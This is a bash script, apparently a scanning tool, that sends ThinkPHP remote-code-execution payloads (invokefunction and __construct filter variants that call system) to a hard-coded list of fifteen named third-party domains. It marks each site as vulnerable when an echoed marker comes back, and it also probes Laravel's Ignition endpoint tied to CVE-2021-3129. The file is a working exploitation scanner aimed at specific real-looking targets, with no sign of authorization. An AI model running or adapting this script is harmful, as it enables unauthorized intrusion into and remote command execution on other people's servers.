#!/bin/bash
# ThinkPHP RCE Check Script
# Payloads:
# P1: standard CNVD-2018-24942
# P2: __construct method filter[]
# P3: __construct method set[]
# P4: Laravel CVE-2021-3129 variant

DOMAINS="bjhzsv.com
bjry168.com
www.joyalltire.com
www.joyalltire.cn
hongguanjixie.com
shimingchina.com
longjoe.com
shanguoying.com
shicone.com
nbzhongxin.net
ihlsx.com
llhyd.com
sxyspos.com
dnsthy.com
yzsci.com"

echo "============================================"
echo "ThinkPHP RCE Scan - $(date)"
echo "============================================"

for domain in $DOMAINS; do
    for scheme in http https; do
        # Payload 1: Standard s=index/think/app/invokefunction
        url1="$scheme://$domain/index.php?s=index/think/app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20TPRCEOK"
        result=$(curl -s -m 5 --max-time 5 -o /dev/null -w "%{http_code}" "$url1" 2>/dev/null)
        body=$(curl -s -m 5 --max-time 5 "$url1" 2>/dev/null)
        if echo "$body" | grep -q "TPRCEOK"; then
            echo "VULNERABLE! [$domain] [$scheme] P1 - HTTP $result - response contains TPRCEOK!"
        else
            echo "SAFE     [$domain] [$scheme] P1 - HTTP $result"
        fi
        
        # Payload 2: __construct with filter[]
        url2="$scheme://$domain/index.php?c=Index&m=Index&a=init&_method=__construct&method=GET&filter[]=system&get[]=echo%20TPRCEOK"
        result2=$(curl -s -m 5 --max-time 5 -o /dev/null -w "%{http_code}" "$url2" 2>/dev/null)
        body2=$(curl -s -m 5 --max-time 5 "$url2" 2>/dev/null)
        if echo "$body2" | grep -q "TPRCEOK"; then
            echo "VULNERABLE! [$domain] [$scheme] P2 - HTTP $result2 - response contains TPRCEOK!"
        else
            echo "SAFE     [$domain] [$scheme] P2 - HTTP $result2"
        fi

        # Payload 3: __construct with set[]
        url3="$scheme://$domain/index.php?c=Index&m=Index&a=init&_method=__construct&method=GET&filter[]=system&set[]=echo%20TPRCEOK"
        result3=$(curl -s -m 5 --max-time 5 -o /dev/null -w "%{http_code}" "$url3" 2>/dev/null)
        body3=$(curl -s -m 5 --max-time 5 "$url3" 2>/dev/null)
        if echo "$body3" | grep -q "TPRCEOK"; then
            echo "VULNERABLE! [$domain] [$scheme] P3 - HTTP $result3 - response contains TPRCEOK!"
        else
            echo "SAFE     [$domain] [$scheme] P3 - HTTP $result3"
        fi

        # Payload 4: Laravel CVE-2021-3129 variant check
        url4="$scheme://$domain/_ignition/execute-solution"
        result4=$(curl -s -m 5 --max-time 5 -o /dev/null -w "%{http_code}" "$url4" 2>/dev/null)
        body4=$(curl -s -m 5 --max-time 5 "$url4" 2>/dev/null)
        if [ "$result4" != "000" ] && [ "$result4" != "" ]; then
            echo "LARAVEL  [$domain] [$scheme] P4 - HTTP $result4 - endpoint exists! Size: $(echo "$body4" | wc -c)"
        else
            echo "NO-LARAVEL [$domain] [$scheme] P4 - HTTP $result4"
        fi
    done
done

echo ""
echo "============================================"
echo "SCAN COMPLETE"
echo "============================================"
